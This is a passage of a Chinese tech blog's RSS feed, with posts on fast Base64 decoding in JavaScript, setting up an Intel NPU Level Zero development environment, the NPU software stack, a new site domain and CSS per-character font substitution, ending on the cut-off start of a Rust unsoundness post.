class="hljs-keyword">const</span> { written } = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TextEncoder</span>().<span class="hljs-title function_">encodeInto</span>(raw, buf)</span><br><span class="line">  <span class="hljs-keyword">return</span> buf.<span class="hljs-title function_">subarray</span>(<span class="hljs-number">0</span>, written)</span><br><span class="line">}</span><br></pre></div></div><p >有没有其他捷径能取代方法一中的热循环呢？答案是使用 <a href="https://developer.mozilla.org/en-US/docs/Web/API/TextEncoder/encodeInto"><code>TextEncoder.encodeInto(str, buf)</code></a> 函数。这个函数会将字符串 <code>str</code> 编码为 <strong>UTF-8</strong> 并写入到字节数组 <code>buf</code> 中。这一切都是在底层的 C++ 代码中完成的，因此性能会更好。以相同方式测试，可以观察到 <code>decode2</code> 的耗时仅有 <code>decode1</code> 的 60%。</p><div class="gk-code hljs" data-gk-id="BLOCK5"><div class="gk-code-display"><pre><span class="line"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">time</span>(<span class="hljs-string">&quot;decode2&quot;</span>)</span><br><span class="line"><span class="hljs-title function_">decode2</span>(b64data)</span><br><span class="line"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">timeEnd</span>(<span class="hljs-string">&quot;decode2&quot;</span>) <span class="hljs-comment">// decode2: 0.7060546875 ms</span></span><br></pre></div></div><h2 id="decode2-的弊端和应用场景">decode2 的弊端和应用场景</h2><p >读者可能会奇怪，为什么 <code>decode2</code> 中将 <code>buf</code> 的长度初始化为 <code>raw.length * 2</code> 而非 <code>raw.length</code> 呢？这是因为 <code>TextEncoder.encodeInto</code> 会将字符串编码为 <strong>UTF-8</strong>，我们得到的其实是原始数据的 UTF-8 表示。由于 <code>b64data</code> 编码自字符串 <code>raw</code>，而 <code>raw</code> 的每个字符范围为 [0, 255]，在 UTF-8 编码后，字符范围为 [128, 255] 的部分会变成两个字节。因此，我们需要将 <code>buf</code> 的长度初始化为 <code>raw.length * 2</code> 作为最大字节数上限。<code>TextEncoder.encodeInto</code> 返回的 <code>written</code> 字段会告诉我们实际写入的字节数，我们可以通过 <code>buf.subarray(0, written)</code> 来截取有效部分。</p><p >可惜，<code>TextEncoder</code> 默认只能编码 UTF-8。如果它支持 Latin-1 编码，<code>decode2</code> 的解码结果便会和原始数据完全等价。那既然 <code>decode2</code> 的结果和原始数据不等价，那它岂不是无用？也不尽然。</p><ul><li><p >如果原始数据的每个字节范围都是 [0, 127]，那么 <code>decode2</code> 的结果和原始数据是等价的。这是因为 ASCII 字符在 UTF-8 编码中仍然是单字节的。因此，如果你的数据确保了这一点，那么 <code>decode2</code> 会是一个更快的解码方法。</p></li><li><p >如果数据的下游能接受这种“异化”后的解码结果，<code>decode2</code> 也可被使用。一个例子是解码后的数据将作为 WebAssembly 模块的输入。我们可以在编写 WASM 代码时提前考虑到这一点，实现一个简单的“双字节 UTF-8 -&gt; 单字节”的转换函数，即可享受 <code>decode2</code> 的性能，并同时兼顾数据的正确性。</p></li></ul>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/JavaScript/">JavaScript</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Codec/">Codec</category>
      
      <category domain="https://i.hsfzxjy.site/tags/WASM/">WASM</category>
      
      
      <comments>https://i.hsfzxjy.site/fast-conversion-from-base64-binary-to-uint8-array/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>折腾 NPU·第1章 —— 搭建 Level Zero 开发环境</title>
      <link>https://i.hsfzxjy.site/l0-npu-dev-env/</link>
      <guid>https://i.hsfzxjy.site/l0-npu-dev-env/</guid>
      <pubDate>Fri, 21 Jun 2024 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;在上一章 &lt;a href=&quot;../l0-npu-prologue/&quot;&gt;折腾 NPU·第0章 —— Intel NPU 概述与 Level-Zero&lt;/a&gt; 中，我们了解了 NPU 的概念以及 NPU 技术栈。本章将介绍如何在 VS Code 中搭建 Level-Zero </description>
        
      
      
      
      <content:encoded><![CDATA[<p >在上一章 <a href="../l0-npu-prologue/">折腾 NPU·第0章 —— Intel NPU 概述与 Level-Zero</a> 中，我们了解了 NPU 的概念以及 NPU 技术栈。本章将介绍如何在 VS Code 中搭建 Level-Zero 开发环境，以便我们在后续章节中编写 NPU 程序。</p><h2 id="编译构建工具准备">编译/构建工具准备</h2><p >在 Windows 系统中，我们需要安装 VS Build Tools 和 CMake 作为编译和构建工具。CMake 可以通过 winget 安装：</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line">winget install Kitware.CMake</span><br></pre></div></div><p >VS Build Tools 则可以从 <a href="https://visualstudio.microsoft.com/downloads/?q=build+tools+for+visual+studio#build-tools-for-visual-studio-2022">这里</a> 下载，其包含了 MSVC 编译器 MSBuild 构建工具，类似于 Linux 中的 GCC 和 GNU Make。在安装时，我们需要勾选以下组件：</p><ul><li>MSVC v143 - VS 2022 C++ x64/x86 build tools</li><li>Windows 11 SDK</li><li>C++ (v143) Universal Windows Platform tools</li><li>C++ CMake tools for Windows</li><li>MSVC v143 - VS 2022 C++ x64/x86 Spectre-mitigated libs</li></ul><p >由于 Level Zero 编译使用了 <code>/Qspectre</code> 选项，列表中的最后一个组件是必选的，否则会有编译错误。如果不慎遗漏了某些组件，后续也可以通过重新运行 VS Installer 进行添加。</p><h2 id="vs-code-准备">VS Code 准备</h2><p >为了方便开发，我们需要在 VS Code 中安装以下插件：</p><ul><li>CMake Tools (<code>ms-vscode.cmake-tools</code>)</li><li>C/C++ (<code>ms-vscode.cpptools</code>)</li></ul><h2 id="初始化项目">初始化项目</h2><p >构建工具准备完成后，我们需要创建一个新的 CMake 项目 <code>OneAPIDemo</code>。该项目包含两个简单的文件：</p><div class="gk-unified-code tab" data-gk-style="tab"><div class="gk-code hljs" data-gk-id="main-cpp-0" data-gk-title="src/main.cpp"><div class="gk-code-display"><pre><span class="line"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br></pre></div></div><div class="gk-code hljs" data-gk-id="cmake-0" data-gk-title="CMakeLists.txt"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">cmake_minimum_required</span>(VERSION <span class="hljs-number">3.10</span>)</span><br><span class="line"><span class="hljs-keyword">project</span>(OneAPIDemo)</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">set</span>(CMAKE_CXX_STANDARD <span class="hljs-number">17</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">add_executable</span>(OneAPIDemo src/main.cpp)</span><br></pre></div></div></div><p >随后，在 VS Code 中执行 <code>CMake: Select a Kit</code>，选择 <code>Visual Studio Build Tools 2022 Release - x86_amd64</code>，并按 <code>Ctrl + F5</code> 尝试运行。如果到此一切正常，我们的项目就已经准备好了。</p><p >当然，我们也可以不依赖 VS Code 的 GUI 操作，而是通过命令行来构建项目。具体说来，我们可以在项目根目录下执行：</p><div class="gk-code hljs" data-gk-id="BLOCK2"><div class="gk-code-display"><pre><span class="line">cmake --build build -G <span class="hljs-string">&quot;Visual Studio 17 2022&quot;</span></span><br><span class="line">cmake --build build --config Debug</span><br></pre></div></div><p >以上两条命令分别对应于 <code>Select a Kit</code> 和 <code>Ctrl + F5</code> 的两个步骤。在构建完成后，我们同样可以在 <code>build/Debug</code> 目录下找到生成的可执行文件 <code>OneAPIDemo.exe</code>。在调试时，VSCode 的快捷方式更加方便，但在 CI/CD 等场景下，命令行构建则更加适用，因此我们有必要了解其背后具体执行的命令。</p><h2 id="准备-level-zero-依赖">准备 Level Zero 依赖</h2><p >这里我们采用 Git Submodule 的方式引入 Level Zero 依赖。在项目根目录下执行：</p><div class="gk-code hljs" data-gk-id="BLOCK3"><div class="gk-code-display"><pre><span class="line">git init</span><br><span class="line">git submodule add https://github.com/oneapi-src/level-zero</span><br><span class="line">git submodule add https://github.com/intel/level-zero-npu-extensions</span><br></pre></div></div><p >这样一来，整个项目变成了自包含的形式，即项目自带所有的依赖库，其他人也因此可以快速构建项目，而不必担心依赖库的安装问题。下载完依赖后，我们需要在 <code>CMakeLists.txt</code> 中添加以下内容：</p><div class="gk-unified-code diff"><div class="gk-code hljs" data-gk-id="DIFF1" data-gk-title="DIFF"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">cmake_minimum_required</span>(VERSION <span class="hljs-number">3.10</span>)</span><br><span class="line"><span class="hljs-keyword">project</span>(OneAPIDemo)</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">set</span>(CMAKE_CXX_STANDARD <span class="hljs-number">17</span>)</span><br><span class="gk-section gk-diff-add" data-gk-sid="DIFF1.SEC1" data-gk-type="diff-add"><span class="line"><span class="hljs-keyword">add_subdirectory</span>(./level-zero EXCLUDE_FROM_ALL)</span><br></span><span class="line"></span><br><span class="line"><span class="hljs-keyword">add_executable</span>(OneAPIDemo src/main.cpp)</span><br><span class="gk-section gk-diff-add" data-gk-sid="DIFF1.SEC2" data-gk-type="diff-add"><span class="line"><span class="hljs-keyword">target_include_directories</span>(OneAPIDemo PUBLIC ./level-zero/<span class="hljs-keyword">include</span>)</span><br><span class="line"><span class="hljs-keyword">target_include_directories</span>(OneAPIDemo PUBLIC ./level-zero-npu-extensions)</span><br><span class="line"><span class="hljs-keyword">target_link_libraries</span>(OneAPIDemo ze_loader)</span><br></span></pre></div></div><div class="gk-code hljs" data-gk-id="cmake-0:1" data-gk-title="CMakeLists.txt"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">cmake_minimum_required</span>(VERSION <span class="hljs-number">3.10</span>)</span><br><span class="line"><span class="hljs-keyword">project</span>(OneAPIDemo)</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">set</span>(CMAKE_CXX_STANDARD <span class="hljs-number">17</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">add_executable</span>(OneAPIDemo src/main.cpp)</span><br></pre></div></div><div class="gk-code hljs" data-gk-id="BLOCK4" data-gk-title="CMakeLists.txt (1)"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">cmake_minimum_required</span>(VERSION <span class="hljs-number">3.10</span>)</span><br><span class="line"><span class="hljs-keyword">project</span>(OneAPIDemo)</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">set</span>(CMAKE_CXX_STANDARD <span class="hljs-number">17</span>)</span><br><span class="line"><span class="hljs-keyword">add_subdirectory</span>(./level-zero EXCLUDE_FROM_ALL)</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">add_executable</span>(OneAPIDemo src/main.cpp)</span><br><span class="line"><span class="hljs-keyword">target_include_directories</span>(OneAPIDemo PUBLIC ./level-zero/<span class="hljs-keyword">include</span>)</span><br><span class="line"><span class="hljs-keyword">target_include_directories</span>(OneAPIDemo PUBLIC ./level-zero-npu-extensions)</span><br><span class="line"><span class="hljs-keyword">target_link_libraries</span>(OneAPIDemo ze_loader)</span><br></pre></div></div></div><h2 id="测试程序">测试程序</h2><p >为测试 Level Zero 是否能正常工作，我们修改 <code>src/main.cpp</code>：</p><div class="gk-code hljs" data-gk-id="BLOCK5"><div class="gk-code-display"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ze_api.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// 一个辅助检测返回值的宏</span></span><br><span class="gk-section gk-zip zipped" data-gk-sid="BLOCK5.SEC1" data-gk-type="zip"><span class="line"><span class="hljs-meta">#<span class="hljs-keyword">define</span> CHECK(result)                                                          \</span></span><br><span class="line"><span class="hljs-meta">  do {                                                                         \</span></span><br><span class="line"><span class="hljs-meta">    auto _result = result;                                                     \</span></span><br><span class="line"><span class="hljs-meta">    <span class="hljs-keyword">if</span> (_result != ZE_RESULT_SUCCESS) {                                        \</span></span><br><span class="line"><span class="hljs-meta">      std::cerr &lt;&lt; <span class="hljs-string">&quot;failed at &quot;</span> &lt;&lt; __FILE__ &lt;&lt; <span class="hljs-string">&quot;:&quot;</span> &lt;&lt; __LINE__                 \</span></span><br><span class="line"><span class="hljs-meta">                &lt;&lt; <span class="hljs-string">&quot;Code: &quot;</span> &lt;&lt; _result &lt;&lt; std::endl;                           \</span></span><br><span class="line"><span class="hljs-meta">      exit(1);                                                                 \</span></span><br><span class="line"><span class="hljs-meta">    }                                                                          \</span></span><br><span class="line"><span class="hljs-meta">  } while (0)</span></span><br></span><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">  <span class="hljs-built_in">CHECK</span>(<span class="hljs-built_in">zeInit</span>(ZE_INIT_FLAG_VPU_ONLY | ZE_INIT_FLAG_GPU_ONLY));</span><br><span class="line">  <span class="hljs-type">uint32_t</span> driverCount = <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-built_in">CHECK</span>(<span class="hljs-built_in">zeDriverGet</span>(&amp;driverCount, <span class="hljs-literal">nullptr</span>));</span><br><span class="line">  std::cout &lt;&lt; <span class="hljs-string">&quot;Driver count: &quot;</span> &lt;&lt; driverCount &lt;&lt; std::endl;</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br></pre></div></div><p >如果看到输出 <code>Driver count: 2</code>，则说明 Level Zero 调用成功了！在这个程序中，我们调用了 <code>zeInit</code> 和 <code>zeDriverGet</code> 两个函数。前者用于初始化 Level Zero，后者用于获取当前系统中的驱动数量。由于 Thinkbook 14p 2024 同时搭载了 GPU 和 NPU，Level Zero 能检测到的驱动数为 <code>2</code>。</p><h2 id="总结-2">总结</h2><p >这一章介绍了如何在 VS Code 中搭建 Level-Zero 开发环境，并通过一个简单的程序测试了 Level Zero 的调用。在下一章中，我们将继续介绍 Level Zero 的设计架构和 API，进一步观察 NPU 的功能使用。</p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/C/">C++</category>
      
      <category domain="https://i.hsfzxjy.site/tags/NPU/">NPU</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Level-Zero/">Level-Zero</category>
      
      
      <comments>https://i.hsfzxjy.site/l0-npu-dev-env/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>折腾 NPU·第0章 —— Intel NPU 概述与 Level-Zero</title>
      <link>https://i.hsfzxjy.site/l0-npu-prologue/</link>
      <guid>https://i.hsfzxjy.site/l0-npu-prologue/</guid>
      <pubDate>Thu, 13 Jun 2024 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;最近入了台 Thinkbook 14p 2024，CPU 是 Intel Ultra5 125H，内有一枚 3720 NPU 芯片，可用于实现低功耗模型推理。藉此机会我深入了解了 NPU 开发的相关知识，以此系列为记。&lt;/p&gt;
&lt;h2 id=&quot;npu-vs-gpu&quot;&gt;NP</description>
        
      
      
      
      <content:encoded><![CDATA[<p >最近入了台 Thinkbook 14p 2024，CPU 是 Intel Ultra5 125H，内有一枚 3720 NPU 芯片，可用于实现低功耗模型推理。藉此机会我深入了解了 NPU 开发的相关知识，以此系列为记。</p><h2 id="npu-vs-gpu">NPU vs GPU</h2><p >NPU 全称为 Neural Processing Unit 即神经处理单元，顾名思义即可优化加速神经网络运算的处理器芯片。在<a href="https://intel.github.io/intel-npu-acceleration-library/npu.html">intel-npu-acceleration-library 的文档</a> 中有一小章专门介绍了 NPU 的架构：</p><blockquote><p >The Intel NPU is an AI accelerator integrated into Intel Core Ultra processors, characterized by a unique architecture comprising compute acceleration and data transfer capabilities. Its compute acceleration is facilitated by Neural Compute Engines, which <strong>consist of hardware acceleration blocks for AI operations like Matrix Multiplication and Convolution</strong>, alongside Streaming Hybrid Architecture Vector Engines for general computing tasks.</p></blockquote><p >此处加粗的部分便是 NPU 相较于其他芯片的亮点，即将神经网络中常见的算子（如矩阵乘法、卷积等）特化至硬件中，从而以较低的功耗高效执行相关运算。</p><p ><strong>与 GPU 相比，NPU 的特化程度更高，计算通用性更低</strong>。开发者可以借助 CUDA 或 SPIRV 为 GPU 编写算子，从而让 GPU 执行任意代码。相比之下，使用 NPU 更像是在搭积木。NPU 预设好了一套基础算子，通过堆叠这些算子开发者得以构建多样化的模型。但 NPU 不支持自定义算子，因此并不是所有模型都能转换成 NPU 上可运行的版本。</p><p ><strong>NPU 侧重于 AI 模型的推理，而 GPU 即可用于推理也可用于训练</strong>。Ultra5 的 NPU 原生支持 FP16 乃至 int8/int4 等低精度运算，从而能够运行量化后的模型，契合当下模型推理的实践。而另一方面，NPU 缺乏对 FP32 的有效支持，在模型训练方面不如 GPU。</p><h2 id="npu-技术栈">NPU 技术栈</h2><p >如果在网上查找 NPU 编程的相关资料，你会看到各种各样的库或概念，如 OpenVINO、DirectML、ONNX Runtime、Level-Zero、OneAPI 等等。它们分别是什么呢？</p><p ><img loading="lazy" src="https://images.anandtech.com/doci/20046/AI%20Deep%20Dive_FINAL%20CLEAN-34.png" alt=""></p><p >我们可以借助上图理解，图中把 NPU 的技术栈分为了三层：</p><ul><li><p ><strong>内核态驱动（KMD Driver）</strong> 这是离用户最远，也是最接近硬件的部分，运行在操作系统内核态直接与硬件打交道，可以不必深入了解。</p></li><li><p ><strong>用户态驱动（UMD Driver）</strong> 这是承上启下的一部分。上层用户通过调用 UMD Driver 提供的 API，可以查询 NPU 硬件的相关信息以及运行模型。对于 Intel NPU 而言，UMD Driver 提供的 API 叫 OneAPI，实现了 OneAPI 的库叫做 Level-Zero。Level-Zero 是用户可访问的最底层的库，它所提供的 API 也是最原始的。</p></li><li><p ><strong>用户库（AI Libraries）</strong> 直接使用 Level-Zero 编程虽然可行，但是非常繁琐。因此，各方推出了一些 high-level 的 AI 库，以方便 AI 研究者开发。它们都有如下特点：</p><ul><li><strong>支持多种编程语言</strong> 大多支持 C++ 和 Python，以方便不同背景的开发者；</li><li><strong>统筹多种硬件</strong> 提供统一的接口调用 CPU、GPU 和 NPU 资源，并有自己的模型中间语言（IR），从而实现异构计算；</li><li><strong>从通用深度学习库编译模型</strong> 提供从 PyTorch、Tensorflow 到自己 IR 的模型编译器，以方便训练好的模型在自己生态系统中的推理部署。</li></ul><p >常见的一些库有：</p><ul><li><strong>DirectML</strong> Microsoft 推出的，仅支持 Windows 平台，但是支持多种厂商的硬件；</li><li><strong>ONNX Runtime</strong> ONNX 是一种标准的 AI 模型格式，它的运行时目前也支持了 NPU；</li><li><strong>OpenVINO</strong> Intel 推出的，跨操作系统，但仅支持 Intel 自己的硬件。</li></ul></li></ul><div class="gk-code hljs" data-gk-id="BLOCK1" data-gk-title="NPU 常见库关系图"><div class="gk-code-display"><pre><span class="line">                                                          +--&gt; [DirectML]</span><br><span class="line">                                                          |</span><br><span class="line">[NPU HW] &lt;-&gt; [KMD/UMD Driver] &lt;-&gt; [Level-Zero] &lt;--OneAPI--+--&gt; [OpenVINO]</span><br><span class="line">                                                          |</span><br><span class="line">                                                          +--&gt; [ONNX Runtime]</span><br></pre></div></div><h2 id="hacking-with-level-zero">Hacking with Level-Zero</h2><p >上图总结了 NPU 常见库的相互联系。作为 AI 研究者，了解顶层 AI 库的一种即可满足日常使用。但本系列将深入挖掘更底层的 OneAPI，直接与 Level-Zero 交互。通过这么做我们将探索三个问题：</p><ol><li><strong>直接访问 Level-Zero 是否能构建更轻量级的程序？</strong> 我们知道 OpenVINO 等库包含了诸多与实际推理无关的功能，如 PyTorch 到 IR 的编译器、为统筹异构硬件所创建的抽象层等。这些部分方便了日常开发调试，但在程序分发时却成为了负担。一是打包时会增大程序体积或有依赖问题，二是会增大程序首次启动的开销。如果用户只是想在自己特定的 NPU 上运行一个特定的模型，不考虑异构也不考虑硬件版本问题，直接访问 Level-Zero 是否可以进一步优化我们的程序？</li><li><strong>Level-Zero 是否有上层 AI 库访问不到的隐藏功能？</strong> NPU 及相关生态目前还处于发展早期，部分功能可能处于测试阶段，因而没有在上层暴露出来。比如在目前，并没有 Intel 之外的人成功将 Stable Diffusion 通过 OpenVINO 转换成 NPU 可运行的格式，而在 <a href="https://github.com/intel/openvino-ai-plugins-gimp">openvino-ai-plugins-gimp</a> 一库中，Intel 也仅以黑盒的方式提供了这一权重。由此可见，OpenVINO 所能处理的格式与 NPU 真正能运行的格式存在一定差距。</li><li><strong>是否能让 llama.cpp/ggml 使用 NPU？</strong> <a href="https://github.com/ggerganov/llama.cpp">llama.cpp</a> 及其背后的 <a href="https://github.com/ggerganov/ggml">ggml</a> 将大模型优化到了极致，实现了在低端硬件上的大模型推理，但目前它们尚不支持 NPU。</li></ol><p >由于 Level-Zero 靠近底层，网上能找到的文档和例子都很少，因此在后续文章中，我会通过逆向 OpenVINO 的代码来了解 Level-Zero 相关的编程。</p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      <category domain="https://i.hsfzxjy.site/categories/Series/">Series</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/C/">C++</category>
      
      <category domain="https://i.hsfzxjy.site/tags/NPU/">NPU</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Level-Zero/">Level-Zero</category>
      
      
      <comments>https://i.hsfzxjy.site/l0-npu-prologue/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>新增域名 monad.run</title>
      <link>https://i.hsfzxjy.site/migrate-monad-run/</link>
      <guid>https://i.hsfzxjy.site/migrate-monad-run/</guid>
      <pubDate>Sun, 28 Apr 2024 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;本站将新增一个域名 &lt;a href=&quot;https://monad.run&quot;&gt;monad.run&lt;/a&gt;，此后旧域名 &lt;a href=&quot;https://i.hsfzxjy.site&quot;&gt;i.hsfzxjy.site&lt;/a&gt; 也将继续保留，与新域名共存，二者皆可用于访问。&lt;/p</description>
        
      
      
      
      <content:encoded><![CDATA[<p >本站将新增一个域名 <a href="https://monad.run">monad.run</a>，此后旧域名 <a href="https://i.hsfzxjy.site">i.hsfzxjy.site</a> 也将继续保留，与新域名共存，二者皆可用于访问。</p><p >新增一个辅助域名，主要考虑到旧域名没有元音不好拼读，不利于读者记忆与传播。此前一位 Reddit 用户 u/Aliics 曾就“hsfzxjy”一名<a href="https://www.reddit.com/r/golang/comments/17g50vb/comment/k6gy2te/?context=3">评论道</a>：</p><blockquote><p  class="par"> So many people have problems remembering “xkcd”, but you’ve ramped that up to another level with your username.</p></blockquote><p  class="par"> 就是说，我的用户名如著名的漫画网站“xkcd”一样难记。这当然是戏谑之言，但事实确如此。除了不方便记忆，原域名甚至可能让杀软产生误报。如另一位 Reddit 用户 u/sheepdog69 <a href="https://www.reddit.com/r/golang/comments/184f62j/comment/kav5k4n/?utm_source=share&utm_medium=web3x&utm_name=web3xcss&utm_term=1&utm_content=share_button">所说</a>，hsfzxjy.site 被 Bitdefender 列为了钓鱼网站。下面有人追评认为此种行为与域名直接相关，但也只是推测。无论如何，这种潜在的影响也是不利的。</p><p >那新域名 monad.run 是怎么选取的呢？我有两方面的考虑。其一当然是经济性。域名说到底只是一个工具，为一个自用的域名花太多钱，有些本末倒置。.run 域名价格普遍在每年100元左右，相对较合理。其二是与站点主题相关。本站发布的多是技术内容，域名多少也要和技术相关。而 Monad 是函数式编程中的一个重要概念，了解 Haskell 的读者应该较为熟悉。run 又有“运行”之意，monad.run 便是一个不错的选择。哪怕是不熟悉 Haskell 或是非技术领域的读者，monad 的拼写也与其预期读音高度一致，从而易于记忆，其也不算过于常见的单词，不致落入俗套。</p><p >在部署方面，目前仅是将 monad.run 302 跳转为 i.hsfzxjy.site。本来最理想的情况是将二者皆 CNAME 到 GitHub Pages，奈何 GitHub Pages 不支持多重 CNAME，只好用此折衷方案。未来若有更好的解决方案，将会更新这一架构。</p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Meta/">Meta</category>
      
      
      <comments>https://i.hsfzxjy.site/migrate-monad-run/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>CSS 中为特定字符设置不同字体</title>
      <link>https://i.hsfzxjy.site/css-font-punc-alternative/</link>
      <guid>https://i.hsfzxjy.site/css-font-punc-alternative/</guid>
      <pubDate>Sun, 14 Apr 2024 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;为追求更好的阅读体验，本站的中文文章采用了混合字体的排版方式。例如在 Windows 环境中，中文字符以 &lt;code&gt;Microsoft Yahei&lt;/code&gt; 渲染，而英文字符则使用 &lt;code&gt;Open Sans&lt;/code&gt; 渲染。由于 &lt;code&gt;Microso</description>
        
      
      
      
      <content:encoded><![CDATA[<p >为追求更好的阅读体验，本站的中文文章采用了混合字体的排版方式。例如在 Windows 环境中，中文字符以 <code>Microsoft Yahei</code> 渲染，而英文字符则使用 <code>Open Sans</code> 渲染。由于 <code>Microsoft Yahei</code> 中也包含英文字符的字形，其在 <code>font-family</code> 中的优先级需排在 <code>Open Sans</code> 后面，从而保证 <code>Open Sans</code> 能够正确渲染英文字符。大致的代码如下：</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line"><span class="hljs-selector-attr">[lang=<span class="hljs-string">&quot;zh&quot;</span>]</span> {</span><br><span class="line">  <span class="hljs-attribute">font-family</span>: <span class="hljs-string">&quot;Open Sans&quot;</span>, <span class="hljs-string">&quot;Microsoft Yahei&quot;</span>, <span class="hljs-built_in">var</span>(--font-fallback);</span><br><span class="line">}</span><br></pre></div></div><p >但这种方式有一个问题，即标点符号的字形比较难看。具体而言是弯引号 <code>U+201C</code> <code>“</code> 和 <code>U+201D</code> <code>”</code>，它们的字形无论在 <code>Microsoft Yahei</code> 或是 <code>Open Sans</code> 中都是半角宽度，且头部和尾部粗细区分不明显，难以辨别前后。反观宋体 <code>SimSun</code> 的呈现则更为清晰，更符合中文排版的习惯。</p><p >那是否可以在 CSS 中为特定字符设置不同字体呢？答案是肯定的。为此我们要在宋体的基础上“改进”出一种新字体，不妨命名为 <code>SimSun-Punc</code>。<code>SimSun-Punc</code> 只用于渲染 <code>U+201C</code> 和 <code>U+201D</code> 两个字符，其余字符则正常回落至 <code>Microsoft Yahei</code> 或 <code>Open Sans</code>：</p><div class="gk-code hljs" data-gk-id="BLOCK2"><div class="gk-code-display"><pre><span class="line"><span class="hljs-selector-attr">[lang=<span class="hljs-string">&quot;zh&quot;</span>]</span> {</span><br><span class="line">  <span class="hljs-attribute">font-family</span>: <span class="hljs-string">&quot;SimSun-Punc&quot;</span>, <span class="hljs-string">&quot;Open Sans&quot;</span>, <span class="hljs-string">&quot;Microsoft Yahei&quot;</span>, <span class="hljs-built_in">var</span>(--font-fallback);</span><br><span class="line">}</span><br></pre></div></div><p ><code>SimSun-Punc</code> 又该怎么定义呢？难道需要根据 <code>SimSun.ttf</code> Subset 出一个新字体文件吗？其实不然，我们可以使用 CSS 的 <code>@font-face</code> 规则，将 <code>SimSun</code> 作为基础字体，再通过 <code>unicode-range</code> 属性限定字符范围，从而实现“改进”字体的效果：</p><div class="gk-code hljs" data-gk-id="BLOCK3"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">@font-face</span> {</span><br><span class="line">  <span class="hljs-attribute">font-family</span>: <span class="hljs-string">&quot;SimSun-Punc&quot;</span>;</span><br><span class="line">  <span class="hljs-attribute">src</span>: <span class="hljs-built_in">local</span>(<span class="hljs-string">&quot;SimSun&quot;</span>);</span><br><span class="line">  unicode-range: U+<span class="hljs-number">201</span>C-<span class="hljs-number">201</span>D;</span><br><span class="line">}</span><br></pre></div></div><p ><a href="https://developer.mozilla.org/en-US/docs/Web/CSS/@font-face/unicode-range"><code>unicode-range</code></a> 属性可用于设置 <code>font-face</code> 所应用的 Unicode 字符范围，这里我们指定了 <code>U+201C</code> 和 <code>U+201D</code> 两个字符，如此一来便只有这两个字符会使用 <code>SimSun-Punc</code> 字体，从而达到预期的效果。</p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Font/">Font</category>
      
      <category domain="https://i.hsfzxjy.site/tags/CSS/">CSS</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Typography/">Typography</category>
      
      
      <comments>https://i.hsfzxjy.site/css-font-punc-alternative/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Arbitary Lifetime Transmutation via Rust Unsoundness</title>
      <link>https://i.hsfzxjy.site/rust-lifetime-transmute-unsoundness/</link>
      <guid>https://i.hsfzxjy.site/rust-lifetime-transmute-unsoundness/</guid>
      <pubDate>Sat, 10 Feb 2024 16:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;Do you believe that one can write a function in safe Rust which can arbitrarily change the lifetime of a reference? For clarity, try to </description>
        
      
      
      
